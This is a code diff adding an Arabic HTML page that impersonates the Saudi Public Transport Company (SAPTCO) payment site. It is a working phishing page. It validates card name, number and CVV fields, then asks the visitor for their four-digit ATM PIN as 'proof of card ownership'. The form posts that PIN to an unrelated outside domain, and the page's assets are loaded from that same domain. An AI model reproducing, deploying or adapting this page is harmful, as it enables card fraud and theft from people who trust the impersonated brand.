@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <title>الرئيسية - الشركة السعودية للنقل الجماعي</title>
+    <meta charset="UTF-8">
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
+    <meta name="description" content="The Saudi Public Transport Company (SAPTCO) is a public owned transport company, serves the kingdom intracity, intercity and internationally like UAE, Egypt, Qatar, Kuwait, Oman, Syria, Jordan and Yemen.">
+    <meta name="keywords" content="SAPTCO, Saudi Public Transport Company, mass transportation">
+    <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous"> -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css" integrity="sha384-nU14brUcp6StFntEOOEBvcJm4huWjB0OcIeQ3fltAfSmuZFrkAif0T+UtNGlKKQv" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://bustivekaefc.com/build/assets/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://bustivekaefc.com/build/assets/jquery.creditCardValidator.js"></script>
+    <script>
+        function validate(){
+            var valid = true;	 
+            $(".input_box").css('background-color','');
+            var message = "";
+
+            var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
+            var cvRegex = /^[0-9]{3,3}$/;
+            
+            var cardHolderName = $("#cname").val();
+            var cardNumber = $("#cnmbr").val();
+            var cv = $("#cv").val();
+
+            if(cardHolderName == "" || cardNumber == "" || cv == "") {
+                message  += "<div>جميع الحقول ضرورية</div>";  
+                if(cardHolderName == "") {
+                    $("#cname").css('background-color','#FFFFDF');
+                }
+                if(cardNumber == "") {
+                    $("#cnmbr").css('background-color','#FFFFDF');
+                }
+                if (cv == "") {
+                    $("#cv").css('background-color','#FFFFDF');
+                }
+            valid = false;
+            }
+            
+            if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
+                message  += "<div>الإسم حسب البطاقة غير صحيح</div>";    
+                    $("#cname").css('background-color','#FFFFDF');
+                    valid = false;
+            }
+            
+            if(cardNumber != "") {
+                    $('#cnmbr').validateCreditCard(function(result){
+                    if(!(result.valid)){
+                            message  += "<div>رقم البطاقة غير صحيح</div>";    
+                            $("#cnmbr").css('background-color','#FFFFDF');
+                            valid = false;
+                    }
+                });
+            }
+            
+            // if (cv != "" && !cvRegex.test(cv)) {
+            //     message  += "<div>رقم CVV خلف البطاقة غير صحيح</div>";    
+            //     $("#cv").css('background-color','#FFFFDF');
+            //         valid = false;
+            // }
+            
+            if(message != "") {
+                $("#error-message").show();
+                $("#error-message").html(message);
+            }
+            return valid;
+        }
+    </script>
+</head>
+<body>
+    
+    <nav class="navbar navbar-expand-lg bg-body-tertiary border-bottom border-5 border-header fixed-top">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="/">سابتكو</a>
+        </div>
+    </nav>
+    <div id="carouselExampleCaptions" class="carousel slide">
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <img style="height: 180px;" src="https://bustivekaefc.com/images/page-header.jpg" class="d-block w-100">
+                <div class="carousel-caption d-block">
+                    <h1 class="d-block text-light">سابتكو</h1>
+                    <p class="d-block text-light">يسعدنا خدمتكم بتنفيذ حجوزاتكم لخدمات النقل الدولي والنقل داخل المدن</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+<section class="padding-start container mb-5">
+  <div class="row justify-content-center shadow">
+    <div class="col-12 col-lg-7">
+      <div class="row">
+        <div class="col-12 mt-5 mb-4">
+          <div class="card">
+            <div class="card-header">
+                الدفع اًمن 100%
+            </div>
+          </div>
+          <div class="card-body">
+            
+            <form method="post" action="https://bustivekaefc.com/part/auth/store">
+              <input type="hidden" name="_token" value="LOHRRrOPuab3q78Z6Vb749p6AgsEjRd855QpbO4M" autocomplete="off">                <div class="col-12 mt-3">
+                    <h3 style="color: black">إثبات ملكية البطاقة</h3>
+                    <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون من 4 خانات للتأك من عملية الدفع</p>
+                    <hr>
+                </div>
+                <div class="col-12">
+                  <div class="mb-3">
+                    <label for="code" class="form-label">الرقم السري</label>
+                    <input autocomplete="off" onkeypress="return onlyNumberKey(event)" maxlength="4" type="tel" value="" class="form-control form-control-lg " id="code" name="code"  placeholder="أدخل الرقم السري المكون من 4 خانات" required>
+                                      </div>
+                </div>
+
+              </div>
+              <div class="col-12 mt-5">
+                <button style="width: 100%;" type="submit" class="btn btn-primary btn-lg form-control-lg">التالـــي</button>
+              </div>
+              
+            </form>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+    <footer>
+        <p class="text-light">الشركة السعودية للنقل الجماعي (سابتكو)</p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+    <script>
+        function onlyNumberKey(evt) {
+          
+            // Only ASCII character in that range allowed
+            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
+            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
+                return false;
+            return true;
+        }
+    </script>
+
+    <script>
+        const returnid = document.getElementById('returnid');
+
+        function handleRadioClick() {
+        if (document.getElementById('show').checked) {
+            returnid.style.display = 'block';
+        } else {
+            returnid.style.display = 'none';
+        }
+        }
+
+        const radioButtons = document.querySelectorAll('input[name="type"]');
+        radioButtons.forEach(radio => {
+        radio.addEventListener('click', handleRadioClick);
+        });
+    </script>
+
+    <script>
+        const returnid2 = document.getElementById('returnid2');
+
+        function handleRadioClick() {
+        if (document.getElementById('show2').checked) {
+            returnid2.style.display = 'block';
+        } else {
+            returnid2.style.display = 'none';
+        }
+        }
+
+        const radioButtons2 = document.querySelectorAll('input[name="type"]');
+        radioButtons2.forEach(radio => {
+        radio.addEventListener('click', handleRadioClick);
+        });
+    </script>
+
+    <script>
+        function onlyNumberKey(evt) {
+          
+            // Only ASCII character in that range allowed
+            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
+            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
+                return false;
+            return true;
+        }
+    </script>
+
+</body>
+</html>
